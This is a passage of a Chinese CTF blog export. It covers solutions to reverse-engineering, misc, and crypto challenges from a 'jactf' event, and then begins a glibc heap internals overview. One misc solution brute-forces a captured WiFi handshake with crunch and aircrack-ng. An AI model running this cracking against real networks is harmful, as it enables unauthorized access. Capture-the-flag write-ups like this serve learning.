class="hljs-number">53</span>, <span class="hljs-number">87</span>, <span class="hljs-number">185</span>, <span class="hljs-number">134</span>, <span class="hljs-number">193</span>, <span class="hljs-number">29</span>, <span class="hljs-number">158</span>, <span class="hljs-number">225</span>, <span class="hljs-number">248</span>, <span class="hljs-number">152</span>, <span class="hljs-number">17</span>, <span class="hljs-number">105</span>, <span class="hljs-number">217</span>, <span class="hljs-number">142</span>, <span class="hljs-number">148</span>, <span class="hljs-number">155</span>, <span class="hljs-number">30</span>, <span class="hljs-number">135</span>, <span class="hljs-number">233</span>, <span class="hljs-number">206</span>, <span class="hljs-number">85</span>, <span class="hljs-number">40</span>, <span class="hljs-number">223</span>, <span class="hljs-number">140</span>, <span class="hljs-number">161</span>, <span class="hljs-number">137</span>, <span class="hljs-number">13</span>, <span class="hljs-number">191</span>, <span class="hljs-number">230</span>, <span class="hljs-number">66</span>, <span class="hljs-number">104</span>, <span class="hljs-number">65</span>, <span class="hljs-number">153</span>, <span class="hljs-number">45</span>, <span class="hljs-number">15</span>, <span class="hljs-number">176</span>, <span class="hljs-number">84</span>, <span class="hljs-number">187</span>]<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">z3_solve</span><span class="hljs-params">(res_flag,byte_4021A0,flag1)</span>:</span>solve_flag = Solver()flag2 = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):flag2.append(BitVec(<span class="hljs-string">'v'</span>+str(i),<span class="hljs-number">8</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):solve_flag.add(( (<span class="hljs-number">16</span> * ((flag2[i] &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>))+(<span class="hljs-number">16</span> * flag2[i] &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>)== flag1[i])check_flag = solve_flag.check()<span class="hljs-keyword">print</span> check_flag,type(check_flag)res_model = solve_flag.model()flag_final = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):flag_chr =(<span class="hljs-string">"%s"</span>%(res_model[flag2[i]]))flag_final  = flag_final + chr(int(flag_chr))<span class="hljs-keyword">print</span> flag_final<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">res_find</span><span class="hljs-params">(list_flag,byte_4021A0)</span>:</span>list_find = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list_flag:res = byte_4021A0.index(i)list_find.append(res)<span class="hljs-keyword">return</span> list_find<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:res = res_find(list_flag,byte_4021A0)<span class="hljs-comment"># for i in res:</span><span class="hljs-comment"># print i</span>z3_solve(list_flag,byte_4021A0,res)<span class="hljs-keyword">print</span> <span class="hljs-string">"Finish\n"</span></code></pre><h1 id="Misc">Misc<a class="post-anchor" href="#Misc"></a></h1><h2 id="真的不是图片">真的不是图片<a class="post-anchor" href="#真的不是图片"></a></h2><p>题目给了一张图片，binwalk一下</p><pre><code class="hljs bash">pumpkin9@pumpkin9:/mnt/c/Users/Desktop/juean$ binwalk Misc-JASEC.pngDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 824 x 639, 8-bit/color RGB, non-interlaced91            0x5B            Zlib compressed data, compressed140598        0x22536         End of Zip archive, footer length: 22</code></pre><p>题目中有zip，和正常压缩包图片对比一下<br>emmm<br>反正是少了个zip头了</p><p><a href="https://tva1.sinaimg.cn/large/006y8mN6ly1g8oaqtqp07j30ht0h544k.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8oaqtqp07j30ht0h544k.jpg" alt></a><br>可以发现 50 4B 03 04 被替换成了ja66</p><pre><code class="hljs bash">pumpkin9@pumpkin9:/mnt/c/Users/Desktop/juean$ binwalk Misc-JASEC.pngDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 824 x 639, 8-bit/color RGB, non-interlaced91            0x5B            Zlib compressed data, compressed137859        0x21A83         Zip archive data, at least v2.0 to extract, compressed size: 2605, uncompressed size: 11258, name: subject.zip140598        0x22536         End of Zip archive, footer length: 22</code></pre><p>然后foremost分离<br>ja66解压缩</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):f = open(<span class="hljs-string">'./'</span>+str(i)+<span class="hljs-string">'/'</span>+str(i)+<span class="hljs-string">'.txt'</span>,<span class="hljs-string">'r'</span>)flag += f.read()<span class="hljs-keyword">print</span> base64.b64decode(flag)<span class="hljs-comment">#jactf&#123;64se64_1s_50_c001&#125;</span></code></pre><h2 id="what">what<a class="post-anchor" href="#what"></a></h2><h3 id="题目描述">题目描述<a class="post-anchor" href="#题目描述"></a></h3><p><code>=E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6</code></p><h3 id="解题过程">解题过程<a class="post-anchor" href="#解题过程"></a></h3><p>Quoted-Printable也是MIME邮件中常用的编码方式之一。同Base64一样，它也将输入的字符串或数据编码成全是ASCII码的可打印字符串。<br><a href="python%E6%A8%A1%E5%9D%97%E4%B9%8Bquopri:%20quoted-printable%E7%BC%96%E8%A7%A3%E7%A0%81">quopri</a><br><code>quopri.decodestring()</code>解码可得</p><p>佛曰：梵僧奢楞奢吉若奢不帝冥夜是缽朋缽真特俱上罰能皤室阿諳明一切呐除梵姪缽婆呐亦參侄呼皤世哆特哆故勝諳爍謹智皤參孕逝諳謹漫死即侄除哆逝侄是奢喝礙豆諳楞無俱者哆度者。諳真冥訶侄勝竟藝奢不伊皤謹涅孕無他羅大得闍哆喝耶僧無羯滅除利缽多梵夷梵栗缽者孕諳盧皤三罰寫老梵耶室帝梵寫羯數梵盡侄栗侄藐俱世諳上諳姪數室婆罰槃奢訶哆多逝藐道梵楞梵南侄迦呐知朋楞侄離呐沙呐智遮大室神冥輸殿缽槃梵怛恐舍知皤迦奢般諳爍寫漫伊俱栗哆他亦缽楞怛冥呼切俱菩舍呐實栗奢波摩諳道缽瑟哆實皤爍勝薩罰諸奢般諦罰明缽諦尼哆楞佛俱醯諳滅度哆所槃姪麼所恐諳他侄寫瑟侄所得隸哆闍呐提盧冥咒奢曰呐沙怯般南怯地缽喝冥想呐盧罰謹呼跋缽上娑諦死侄迦</p><p>参悟佛所言的真意<br>公正友善自由公正民主公正和谐法治自由公正公正法治友善平等公正爱国公正平等法治爱国公正敬业公正友善爱国平等诚信平等法治敬业法治平等公正公正公正诚信平等平等友善敬业法治民主法治富强法治友善法治<br>社会主义核心价值观解码得flag<br><code>jactf{hexin_yufo_qp}</code></p><h2 id="小梳子">小梳子<a class="post-anchor" href="#小梳子"></a></h2><p>生成字典爆破</p><pre><code class="hljs bash">crunch 11 11 -t 138364%%%%% -o/root/桌面/test.txtaircrack-ng -w /root/桌面/test.txt Tenda_D07D90-01.cap</code></pre><h1 id="Crypto">Crypto<a class="post-anchor" href="#Crypto"></a></h1><h2 id="贝斯家族三英战群魔">贝斯家族三英战群魔<a class="post-anchor" href="#贝斯家族三英战群魔"></a></h2><p>直接上脚本</p><pre><code class="hljs python">$ python base.py ciphertext_ea88a4d420c804686a8899608e06130f.txt<span class="hljs-number">1</span>using base16 decode sucess.....<span class="hljs-number">2</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">3</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">4</span>using base16 decode sucess.....<span class="hljs-number">5</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">6</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">7</span>using base16 decode sucess.....<span class="hljs-number">8</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">9</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">10</span>using base16 decode sucess.....<span class="hljs-number">11</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">12</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">13</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode failuer.....jactf&#123;<span class="hljs-number">4</span>(b64_32_16)&#125;</code></pre><h2 id="罗马帝国的奠基者">罗马帝国的奠基者<a class="post-anchor" href="#罗马帝国的奠基者"></a></h2><p>根据凯撒加密方式和flag格式可得</p><pre><code class="hljs python">a = <span class="hljs-string">'h^_o`[pZi^i`'</span>b = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">90</span>):  b= <span class="hljs-string">""</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a)):    b += chr(ord(a[i])+i+<span class="hljs-number">2</span>)  <span class="hljs-keyword">print</span> b</code></pre><h2 id="绝密情报">绝密情报<a class="post-anchor" href="#绝密情报"></a></h2><h3 id="题目描述-1">题目描述<a class="post-anchor" href="#题目描述-1"></a></h3><blockquote><p>WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0xd<br>而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？</p></blockquote><h3 id="解题过程-1">解题过程<a class="post-anchor" href="#解题过程-1"></a></h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64,libnumenc = <span class="hljs-string">"WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0xd"</span>enc = base64.b64decode(enc)enc_list = eval(enc)flag = <span class="hljs-string">""</span><span class="hljs-keyword">print</span> enc_listd = <span class="hljs-number">3960784897</span>n = <span class="hljs-number">5520780427</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(enc_list)):m = pow(enc_list[i],d,n)flag += chr(m)<span class="hljs-keyword">print</span> flag<span class="hljs-comment">#U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5</span></code></pre><p>des 解密下即可<br>jactf{So_easy_RSA_and_DES}</p><h2 id="贝叶斯">贝叶斯<a class="post-anchor" href="#贝叶斯"></a></h2><h3 id="题目">题目<a class="post-anchor" href="#题目"></a></h3><p>一共给了两个文件<br>encode.txt</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">P</span><span class="hljs-params">(<span class="hljs-string">"*****************"</span>)</span></span>;<span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-string">"*****************"</span>)</span></span>;<span class="hljs-keyword">int</span> len = C.length();<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; len; k ++) &#123;<span class="hljs-keyword">int</span> where = des_find(P, C[k]);where = ((where * a) + b) mod x;<span class="hljs-built_in">cout</span> &lt;&lt; P[where];&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span></span>&#123;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; p.length(); i++) &#123;<span class="hljs-keyword">if</span> (m == p[i]) &#123;<span class="hljs-keyword">return</span>  i;&#125;&#125;&#125;</code></pre><p>题目.txt</p><blockquote><p>现已知某间谍使用的密码本（这可是贝叶斯设计的密码本）如下：”elFXRVJUWVVJT1B4Y3Zibm1hc2RmQVNERkdISktMZ2hqa2xfcXdaWENWQk5NZXJ0e3l1aW9wfTAxMjM0OTg3NjU=”<br>现获取到了他们的加密算法，同时劫获了一段数据密文：”gf9C{YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7”<br>你能破译出明文数据吗？</p></blockquote><h3 id="解题过程-2">解题过程<a class="post-anchor" href="#解题过程-2"></a></h3><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PSIZE 65   <span class="hljs-comment">//宏定义密码表大小</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">init_gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">P</span><span class="hljs-params">(<span class="hljs-string">"zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert&#123;yuiop&#125;0123498765"</span>)</span></span>;               <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">M</span><span class="hljs-params">(<span class="hljs-string">"gf9C&#123;YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7"</span>)</span></span>;   <span class="hljs-comment">//明文空间，与已知密文</span>  <span class="hljs-built_in">string</span> C;  <span class="hljs-comment">//存放解密明文</span>  <span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;   <span class="hljs-comment">//求解所有互素的数</span>  <span class="hljs-keyword">int</span> a1;  <span class="hljs-comment">//存放逆元</span>  <span class="hljs-keyword">for</span> (i; i &lt; PSIZE; i++)  &#123;    <span class="hljs-keyword">if</span> (gcd(i, PSIZE) == <span class="hljs-number">1</span>)    &#123;  <span class="hljs-comment">//说明此时的i与28互素</span>      <span class="hljs-comment">/***求解此时的i的逆元***/</span>      a1 = init_gcd(i, PSIZE);      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; PSIZE; j++)   <span class="hljs-comment">//控制b的遍历</span>      &#123;        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"此时：a="</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">" b="</span> &lt;&lt; j &lt;&lt; <span class="hljs-string">" a的逆元为："</span> &lt;&lt; a1 &lt;&lt; <span class="hljs-string">"   \""</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; M.length(); k++) &#123;     <span class="hljs-comment">//每一个汉字站两个字节，所以要用两个数组空间来存</span>          <span class="hljs-keyword">int</span> where = des_find(P, M[k]);   <span class="hljs-comment">//匹配密文在明文空间的位置</span>          where = ((where - j)*a1) % PSIZE;          <span class="hljs-keyword">if</span> (where &lt; <span class="hljs-number">0</span>) &#123;            where += PSIZE;          &#125;          <span class="hljs-built_in">cout</span> &lt;&lt; P[where];        &#125;        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"\""</span> &lt;&lt; <span class="hljs-built_in">endl</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> a)</span>    <span class="hljs-comment">//求互素</span></span>&#123;  <span class="hljs-keyword">int</span> temp;  <span class="hljs-keyword">if</span> (a &lt; b)<span class="hljs-comment">//判断大小</span>  &#123;    temp = a;    a = b;    b = temp;  &#125;  <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> a;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> gcd(b, a%b);<span class="hljs-comment">//递归</span>&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">init_gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span>   <span class="hljs-comment">//扩展欧几里得算法</span></span>&#123;  <span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;  <span class="hljs-keyword">for</span> (i; i &lt; <span class="hljs-number">28</span>; i++)  &#123;    <span class="hljs-keyword">if</span> ((m*i) % n == <span class="hljs-number">1</span>)    &#123;      <span class="hljs-keyword">return</span> i;    &#125;  &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span>   <span class="hljs-comment">//位置匹配函数</span></span>&#123;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; p.length(); i ++) &#123;    <span class="hljs-comment">//cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl;</span>    <span class="hljs-keyword">if</span> (m == p[i]) &#123;      <span class="hljs-keyword">return</span>  i;    &#125;  &#125;&#125;</code></pre><p><strong>接下来的计划</strong><br>总结下base家族<br>wasm<br>贝叶斯<br>关于字符向进制转化的算法与逆向<br>pyc 文件格式<br>des加密ebc cbc</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc heap overview</title>
      <link href="/2019/01/05/Glibc-heap-overview/"/>
      <url>/2019/01/05/Glibc-heap-overview/</url>
      
        <content type="html"><![CDATA[<h1 id="Glibc-Heap">Glibc Heap<a class="post-anchor" href="#Glibc-Heap"></a></h1><ul><li>负责维护动态分配内存的数据结构称为 heap</li><li>libc 里面比较常用到的是 malloc 、free 、realloc<ul><li>C++ 里的 new、delete，底层的操作仍是上述的几个</li></ul></li><li>分配新内存空间、释放并回收不需要的部分，在分配内存的时候尽量避免<code>碎片化</code></li></ul><h2 id="Glibc-heap-实际操作概述">Glibc heap 实际操作概述<a class="post-anchor" href="#Glibc-heap-实际操作概述"></a></h2><ul><li><code>glibc/malloc/malloc.c</code></li><li>要做到堆内存的管理，需要知道<ul><li>有哪些位置的堆内存是可以被分配的</li><li>有哪些是因为 free 掉而可以回收的</li><li>有哪些位置是使用中则不需要记录，使用它们的人应记住这些指针</li></ul></li><li>整个 heap 的结构记录在一个 <code>struct malloc_state</code>中，称为 <code>main_arena</code></li><li><code>malloc</code> 分配的堆内存结构体称为 chunk，会比要求的大小要大一点，因为需要记录一些维护 heap 用的额外信息</li><li><code>arena</code> 跟 heap 分配的内存分开存放，heap overflow 无法直接去覆盖它的内容</li><li>回收的 chunk 用 linked list 记录，称为 bin</li><li>main_arena 中有很多个 bin，每个 bin 里存储的 chunk size 不同，目的是让 malloc 时可以尽快找到最适合大小的 chunk</li><li>回收的 chunk 会依据 size 来决定应该放那个 linked list</li><li><code>malloc</code> 时，优先从 bin 里面找出可以使用的 chunk，如果找不到才会真的分配新的内存给程序使用。分配时可以去找到足够大的 chunk 只切出需要的部分，剩下的部分形成新的 chunk<code>(last_remainder)</code>。</li><li>找不到可用空间时会从 top chunk 分配，top chunk 是一个很大的 chunk，代表可使用但未分配的内存，malloc 分配时会从里面切一小块下来，剩下的部分重新设为 top</li></ul><h2 id="Chunk">Chunk<a class="post-anchor" href="#Chunk"></a></h2><ul><li><p>存放 chunk metadata 的 chunk 结构 （header）</p></li><li><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>&#123;</span>  <span class="hljs-keyword">size_t</span> prev_size;  <span class="hljs-keyword">size_t</span> size;  malloc_chunk* fd;  malloc_chunk* bk;  malloc_chunk* fd_nextsize;  malloc_chunk* bk_nextsize;&#125;</code></pre></li><li><p>64 bit</p><ul><li><code>mem = malloc(size) -&gt; chunk=mem-16; chunksize = (size+8)#16</code></li><li>实际的 chunk 地址是 malloc 得到的地址 